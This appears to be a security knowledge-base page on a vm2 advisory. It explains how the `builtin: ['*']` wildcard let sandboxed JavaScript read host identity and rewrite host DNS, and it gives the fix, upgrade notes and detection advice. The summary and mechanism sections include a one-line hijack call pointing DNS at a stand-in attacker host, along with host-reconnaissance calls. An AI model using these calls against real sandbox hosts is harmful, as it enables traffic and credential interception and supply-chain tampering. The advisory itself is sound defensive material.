# vm2 NodeVM host state exposure and DNS hijack (GHSA-m5w8-4gq2-6f8x)

## Summary
vm2 (npm, roughly 5 million downloads per month) through **3.11.5** let sandboxed JavaScript read the host process owner's identity and rewrite the host process's DNS resolver list, because the documented `builtin: ['*']` wildcard admitted the `os` and `dns` built-in modules into the sandbox. One call to `dns.setServers(['attacker.example:53'])` redirected every subsequent name resolution the host process performs — outbound HTTP, telemetry, package registry, fetch calls — to an attacker-controlled server, with no alert, no rate limit, and no notification to the embedder. The mutation persists in the host realm after the sandbox run returns.

Fixed in **vm2 3.11.6** (GHSA-m5w8-4gq2-6f8x, CVSS 10.0, Critical). The advisory was published to the GitHub Advisory Database on August 17, 2026; the fix was committed to `main` on August 9, 2026, and released August 14, 2026. No in-the-wild exploitation is reported.

## Tags
- tools
- vm2
- Node.js
- JavaScript
- sandbox escape
- host DNS hijacking
- information disclosure
- builtin wildcard
- readonly proxy
- DNS rebinding
- credential interception
- supply-chain
- CVE
- GHSA-m5w8-4gq2-6f8x
- critical vulnerability
- OX Security

## Why this matters
- vm2 is the execution engine for many low-code platforms, webhook and rules executors, plugin systems, and CI job runners that run untrusted JavaScript. Any of those hosts that use `builtin: ['*']` (which vm2's own README calls "a non-sandbox configuration") can have host identity read and host DNS rewritten by the code they are sandboxing.
- The root cause is a denylist inversion: `'*'` expands to every Node built-in **minus a hardcoded denylist**, so the default is allow and new Node built-ins are admitted by default. The denylist entries that previously arrived under GHSA-9g8x-92q2-p28f carried a rationale describing exactly this category — modules that "expose state of the entire host process rather than sandbox-local state" — and `os` and `dns` match that category but were never listed.
- A host DNS hijack turns sandboxed code into a credential-interception primitive against host traffic it never touches directly, and a supply-chain primitive against the next dependency fetch.

## Mechanism
`NodeVM` extends vm2's boundary with an opt-in `require` governed by a `builtin` allowlist: the embedder names which Node built-in modules may cross into the sandbox, and everything unnamed stays out. The allowlist accepts the `'*'` wildcard meaning "everything vm2 considers safe" — and what `'*'` resolves to is decided by a denylist inside vm2, not by the embedder.

Admitted modules load through a readonly proxy that forwards every method call into the host realm. Readonly blocks property **assignment**, not method **calls** — so under `builtin: ['*']` on vm2 ≤ 3.11.5, sandboxed code could:

- `os.userInfo()` — the host process owner's uid, gid, username, home directory, and shell (privilege level and targeting paths);
- `os.networkInterfaces()` — every host interface with IPs and MAC addresses, including container and VM veth pairs (internal-network mapping);
- `dns.setServers(['attacker.example:53'])` — replace the host process-wide DNS resolver list in a single statement;
- `os.setPriority()` — a second host-process write in the same class.

Both mutations persist in the host realm after the sandbox run returns, with no audit trail or notification to the embedder.

## Affected and patched versions
| Product | Affected | Patched |
|---|---|---|
| vm2 (npm) | ≤ 3.11.5 | 3.11.6 |

The fix adds `os` and `dns` to the `DANGEROUS_BUILTINS` denylist in `lib/builtin.js`, at both enforcement layers — the wildcard expansion filter and the explicit-allowlist path. The denial is deliberately broad: `builtin: ['os']` is rejected even when an embedder names it on purpose.

## Upgrade notes
- Move to vm2 3.11.6. Code calling `os.platform()`, `os.EOL`, or `os.tmpdir()` inside the sandbox will start throwing `Cannot find module 'os'` after the upgrade.
- Restore just the safe surface with a hand-written wrapper through `mock`, which continues to work on 3.11.6:
  ```js
  const vm = new NodeVM({
    require: {
      builtin: ['*'],
      mock: { os: { platform: () => 'linux', EOL: '\n' } }
    }
  });
  ```
- Note that even the patched release still exposes `child_process` under the wildcard; treat `builtin: ['*']` as a non-sandbox configuration and keep the allowlist explicit where feasible.

## Detection
- Hunt for Node processes whose name resolution began pointing at unexpected resolvers; compare observed DNS servers against configured resolvers on hosts that run vm2-based services.
- Alert on host processes performing `os.userInfo()`-style identity reads from contexts that should be sandboxed, and on container/VM interface enumeration from application processes.
- Review the vm2 version in dependency inventories for anything ≤ 3.11.5, prioritizing hosts where untrusted code runs (CI runners, plugin hosts, webhook executors, low-code backends).

## Assessment limits
- OX Security published the analysis; no in-the-wild exploitation, PoC abuse, or actor linkage is reported.
- The practical exploitability of the host DNS hijack depends on the embedder's network position: hosts whose outbound traffic goes through a pinned DNS or split-horizon setup are less exposed, and containerized hosts lose less than bare-metal ones, but the host-process mutation still applies.

## Related pages
- [npm install explicit-trust controls](../patterns/npm-install-explicit-trust-controls.md)
- [npm publish-time malware scanning and dual-use declarations](../patterns/npm-publish-time-malware-scanning.md)
- [Kiota OpenAPI metadata command injection](../patterns/kiota-openapi-metadata-command-injection.md)

## Sources
- OX Security: [Critical vm2 vulnerability allows host DNS hijacking and information disclosure](https://www.ox.security/blog/critical-vm2-vulnerability-allows-host-dns-hijacking-and-information-disclosure/) — August 18, 2026
- GitHub: [GHSA-m5w8-4gq2-6f8x advisory](https://github.com/advisories/GHSA-m5w8-4gq2-6f8x)
